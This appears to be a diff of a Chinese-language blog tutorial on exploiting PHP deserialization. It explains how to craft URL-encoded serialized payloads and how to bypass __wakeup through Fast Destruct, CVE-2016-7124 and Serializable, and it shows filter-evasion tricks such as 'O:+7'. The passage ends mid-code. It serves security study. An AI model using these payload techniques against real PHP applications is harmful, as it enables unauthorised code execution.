+alt="在这里插入图片描述" 
                 ></p>
-<h2 id="生成序列化数据"><a href="#生成序列化数据" class="headerlink" title="生成序列化数据"></a>生成序列化数据</h2><p>要利用反序列化漏洞，必须向 <code>unserialize()</code> 函数传入构造的序列化数据（定义合适的属性值），这就需要我们生成序列化数据。序列化数据通常利用 <code>serialize()</code> 函数生成。</p>
+<h2 id="生成序列化数据">生成序列化数据</h2>
+<p>要利用反序列化漏洞，必须向 <code>unserialize()</code>
+函数传入构造的序列化数据（定义合适的属性值），这就需要我们生成序列化数据。序列化数据通常利用
+<code>serialize()</code> 函数生成。</p>
 <p>生成步骤：</p>
-<ol>
-<li><p>把题目代码复制到本地；</p>
-</li>
-<li><p>注释掉与属性无关的内容（方法和没用的代码）；</p>
-</li>
-<li><p>对属性赋值；</p>
-</li>
+<ol type="1">
+<li><p>把题目代码复制到本地；</p></li>
+<li><p>注释掉与属性无关的内容（方法和没用的代码）；</p></li>
+<li><p>对属性赋值；</p></li>
 <li><p>输出 URL 编码后的序列化数据：</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>())));</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>将序列化数据发送到目标服务器。</p>
-</li>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>())));</span><br></pre></td></tr></table></figure></div></li>
+<li><p>将序列化数据发送到目标服务器。</p></li>
 </ol>
 <p>进行URL编码的原因：</p>
 <ul>
 <li>原始的序列化数据可能存在不可见字符；</li>
 <li>如果不进行编码，最后输出的结果是片段的，不是全部的，会有类似截断导致结果异常。</li>
 </ul>
-<h2 id="属性赋值"><a href="#属性赋值" class="headerlink" title="属性赋值"></a>属性赋值</h2><p>生成序列化数据过程中需要对对象属性进行赋值，主要有 3 种方法：</p>
+<h2 id="属性赋值">属性赋值</h2>
+<p>生成序列化数据过程中需要对对象属性进行赋值，主要有 3 种方法：</p>
 <ul>
 <li><p><strong>直接在属性中赋值</strong>：优点是方便，缺点是只能赋值字符串。</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$arg</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>())));</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>外部赋值</strong>：优点是可以赋值任意类型的值，缺点是只能操作 public 属性。</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$arg</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;arg = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>)));</span><br></pre></td></tr></table></figure></div>
-</li>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$arg</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>())));</span><br></pre></td></tr></table></figure></div></li>
+<li><p><strong>外部赋值</strong>：优点是可以赋值任意类型的值，缺点是只能操作
+public 属性。</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$arg</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;arg = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>)));</span><br></pre></td></tr></table></figure></div></li>
 <li><p><strong>构造方法赋值</strong>：优点是解决了上述的全部缺点，缺点是有点麻烦。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$arg</span> ;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>())));</span><br></pre></td></tr></table></figure></div></li>
 </ul>
-<h1 id="PHP-反序列化绕过"><a href="#PHP-反序列化绕过" class="headerlink" title="PHP 反序列化绕过"></a>PHP 反序列化绕过</h1><h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup 绕过"></a>__wakeup 绕过</h2><h3 id="Fast-Destruct-绕过"><a href="#Fast-Destruct-绕过" class="headerlink" title="Fast Destruct 绕过"></a>Fast Destruct 绕过</h3><p>以下面这段代码为例：</p>
+<h1 id="php-反序列化绕过">PHP 反序列化绕过</h1>
+<h2 id="wakeup-绕过">__wakeup 绕过</h2>
+<h3 id="fast-destruct-绕过">Fast Destruct 绕过</h3>
+<p>以下面这段代码为例：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$b = new B();</span></span><br><span class="line"><span class="comment">//$b-&gt;b = new A();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;A&quot;:0:&#123;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
-
 <p>这段代码输出结果如下：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A::__wakeup</span><br><span class="line">B::__wakeup</span><br><span class="line">B::__destruct</span><br><span class="line">A::__destruct</span><br></pre></td></tr></table></figure></div>
-
-<p>也就是 <code>__wakeup</code> 和 <code>__destruct</code> 的调用顺序为：</p>
+<p>也就是 <code>__wakeup</code> 和 <code>__destruct</code>
+的调用顺序为：</p>
 <ul>
 <li>先初始化成员类后初始化自身。</li>
 <li>先析构自身再析构成员类。</li>
 </ul>
-<p>假如我们破坏这个序列化字符串的结构，例如删除调最后一个 <code>&#125;</code>（这里破坏方式很多，可以随便改改试试），那么 <strong>PHP 会认为这个对象以及构造出错了，因此会立即析构对象</strong>。</p>
-<p>然而下面这个序列化字符串并没有对 <code>__wakeup</code> 和 <code>__destruct</code> 的调用顺序造成影响。</p>
+<p>假如我们破坏这个序列化字符串的结构，例如删除调最后一个
+<code>&#125;</code>（这里破坏方式很多，可以随便改改试试），那么 <strong>PHP
+会认为这个对象以及构造出错了，因此会立即析构对象</strong>。</p>
+<p>然而下面这个序列化字符串并没有对 <code>__wakeup</code> 和
+<code>__destruct</code> 的调用顺序造成影响。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;A&quot;:0:&#123;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>这是因为<strong>如果 PHP 的一个对象要想调用 <code>__destruct</code>
+那么就必须先调用这个对象的
+<code>__wakeup</code>（如果定义的话）完成初始化，避免一些安全问题。</strong></p>
+<p>而又因为要满足<strong>先初始化成员类后初始化自身</strong>，因此需要在调用
+<code>B::__wakeup</code> 前先调用 <code>A::__wakeup</code> 。</p>
+<p>总之因为 <strong><code>B</code> 定义了
+<code>__wakeup</code></strong>，根据一些列限制使得 <code>__wakeup</code>
+和 <code>__destruct</code> 调用顺序没有发生变化。</p>
+<p>如果我们把 <code>B::__wakeup</code> 删掉，那么我们就没有了调用
+<code>B::__destruct</code> 前先调用 <code>B::__wakeup</code>
+的限制和调用 <code>B::__wakeup</code> 前先调用 <code>A::__wakeup</code>
+的限制，因此 <code>B::__destruct</code> 会立即调用。至此我们绕过了
+<code>A::__wakeup</code>。 <img 
 
-<p>这是因为<strong>如果 PHP 的一个对象要想调用 <code>__destruct</code> 那么就必须先调用这个对象的 <code>__wakeup</code>（如果定义的话）完成初始化，避免一些安全问题。</strong></p>
-<p>而又因为要满足<strong>先初始化成员类后初始化自身</strong>，因此需要在调用 <code>B::__wakeup</code> 前先调用 <code>A::__wakeup</code> 。</p>
-<p>总之因为 **<code>B</code> 定义了 <code>__wakeup</code>**，根据一些列限制使得 <code>__wakeup</code> 和 <code>__destruct</code> 调用顺序没有发生变化。</p>
-<p>如果我们把 <code>B::__wakeup</code> 删掉，那么我们就没有了调用 <code>B::__destruct</code> 前先调用 <code>B::__wakeup</code> 的限制和调用 <code>B::__wakeup</code> 前先调用 <code>A::__wakeup</code> 的限制，因此 <code>B::__destruct</code> 会立即调用。至此我们绕过了 <code>A::__wakeup</code>。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/4fa57db9057dd2a65a476d1da7a3f474.png"
-                      alt="在这里插入图片描述"
-                ><br>如果在 <code>B::__destruct</code> 有与 <code>A</code> 相关的一些操作，<strong>那么就可能因为 <code>B::__destruct</code> 在 <code>A::__wakeup</code> 之前调用从而导致一些安全问题</strong>。</p>
-<h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><p>Fast Destruct 是通过<strong>对象自身</strong>序列化出错导致提前析构绕过了<strong>成员对象</strong>的 <code>__wakeup</code> 函数。而 CVE-2016-7124 则是<strong>对象自身</strong>序列化出错导致提前析构绕过了<strong>对象自身</strong>的 <code>__wakeup</code> 函数。</p>
-<p>在 PHP 5.6.25 之前版本和 7.0.10 之前的版本，<strong>当对象的属性（变量）数大于实际的个数时，<code>__wakeup()</code> 方法不会被执行</strong>。这意味着攻击者可以通过操纵序列化数据，添加多余的属性，从而绕过 <code>__wakeup()</code> 方法中的安全检查或初始化逻辑。</p>
+                     data-src="images/4fa57db9057dd2a65a476d1da7a3f474.png"
+                     
+alt="在这里插入图片描述" 
+                > 如果在 <code>B::__destruct</code> 有与
+<code>A</code> 相关的一些操作，<strong>那么就可能因为
+<code>B::__destruct</code> 在 <code>A::__wakeup</code>
+之前调用从而导致一些安全问题</strong>。</p>
+<h3 id="cve-2016-7124">CVE-2016-7124</h3>
+<p>Fast Destruct
+是通过<strong>对象自身</strong>序列化出错导致提前析构绕过了<strong>成员对象</strong>的
+<code>__wakeup</code> 函数。而 CVE-2016-7124
+则是<strong>对象自身</strong>序列化出错导致提前析构绕过了<strong>对象自身</strong>的
+<code>__wakeup</code> 函数。</p>
+<p>在 PHP 5.6.25 之前版本和 7.0.10
+之前的版本，<strong>当对象的属性（变量）数大于实际的个数时，<code>__wakeup()</code>
+方法不会被执行</strong>。这意味着攻击者可以通过操纵序列化数据，添加多余的属性，从而绕过
+<code>__wakeup()</code> 方法中的安全检查或初始化逻辑。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">phpversion</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常情况下，反序列化调用 __wakeup 和 __destruct</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;A&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line"><span class="comment">// A::__wakeup</span></span><br><span class="line"><span class="comment">// A::__destruct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当对象属性数大于实际的个数时，绕过 __wakeup，直接调用 __destruct</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;A&quot;:114514:&#123;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line"><span class="comment">// A::__destruct</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="custom-object-绕过"><a href="#custom-object-绕过" class="headerlink" title="custom object 绕过"></a>custom object 绕过</h3><p>使用  Serializable 接口自定义序列化后，由于自定义对象 (<code>custom object</code>) 并不支持 <code>__wakeup()</code> 方法，因此可以用于绕过 <code>__wakeup</code> 方法中的安全检查或初始化逻辑。</p>
+<h3 id="custom-object-绕过">custom object 绕过</h3>
+<p>使用 Serializable 接口自定义序列化后，由于自定义对象
+(<code>custom object</code>) 并不支持 <code>__wakeup()</code>
+方法，因此可以用于绕过 <code>__wakeup</code>
+方法中的安全检查或初始化逻辑。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="string">&quot;sensitive data&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 自定义序列化逻辑</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 自定义反序列化逻辑</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 Serializable 接口后，使用 C 标识符绕过 __wakeup</span></span><br><span class="line"><span class="variable">$serialized_custom</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Serialized custom: <span class="subst">$serialized_custom</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化自定义对象</span></span><br><span class="line"><span class="variable">$custom_object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized_custom</span>);</span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line"><span class="comment">// A::unserialize</span></span><br><span class="line"><span class="comment">// A::__destruct</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><h3 id="类属性绕过"><a href="#类属性绕过" class="headerlink" title="类属性绕过"></a>类属性绕过</h3><p>在 PHP 7.1 之前，反序列化时严格区分属性的可见性，即使是同名的属性，由于前缀不同，也会被视为不同的属性。然而，从 PHP 7.1 开始，反序列化对属性可见性的处理变得不那么严格，这使得某些保护机制可以被绕过。</p>
-<p>例如下面这个例子即使没有 <code>\0*\0</code> 前缀依然会输出 <code>abc</code>。</p>
+<h2 id="过滤绕过">过滤绕过</h2>
+<h3 id="类属性绕过">类属性绕过</h3>
+<p>在 PHP 7.1
+之前，反序列化时严格区分属性的可见性，即使是同名的属性，由于前缀不同，也会被视为不同的属性。然而，从
+PHP 7.1
+开始，反序列化对属性可见性的处理变得不那么严格，这使得某些保护机制可以被绕过。</p>
+<p>例如下面这个例子即使没有 <code>\0*\0</code> 前缀依然会输出
+<code>abc</code>。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">phpversion</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:7:&quot;MyClass&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="数字绕过"><a href="#数字绕过" class="headerlink" title="数字绕过"></a>数字绕过</h3><p>在PHP的安全问题中，特别是反序列化安全漏洞中，检测序列化字符串是否以对象字符串开头是一个常见的防御措施。通常我们会使用正则表达式来匹配这种情况。然而，在一些特定情况下，攻击者可以利用一些技巧绕过这些检测，比如通过加号绕过。</p>
+<h3 id="数字绕过">数字绕过</h3>
+<p>在PHP的安全问题中，特别是反序列化安全漏洞中，检测序列化字符串是否以对象字符串开头是一个常见的防御措施。通常我们会使用正则表达式来匹配这种情况。然而，在一些特定情况下，攻击者可以利用一些技巧绕过这些检测，比如通过加号绕过。</p>
 <p>我们可以使用以下正则表达式来检测序列化字符串是否以对象字符串开头：</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>, <span class="variable">$data</span>)</span><br></pre></td></tr></table></figure></div>
-
-<p>这个正则表达式匹配任何以 <code>O:</code> 开头并跟随一个或多个数字的字符串，这通常表示PHP序列化对象。</p>
-<p>在 PHP 7.2 之前，序列化数据中的数字字段可以加符号，比如 <code>O:7:&quot;MyClass</code> 可以改为 <code>O:+7:&quot;MyClass</code>。</p>
+<p>这个正则表达式匹配任何以 <code>O:</code>
+开头并跟随一个或多个数字的字符串，这通常表示PHP序列化对象。</p>
+<p>在 PHP 7.2 之前，序列化数据中的数字字段可以加符号，比如
+<code>O:7:"MyClass</code> 可以改为 <code>O:+7:"MyClass</code>。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/O:\d+/&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">    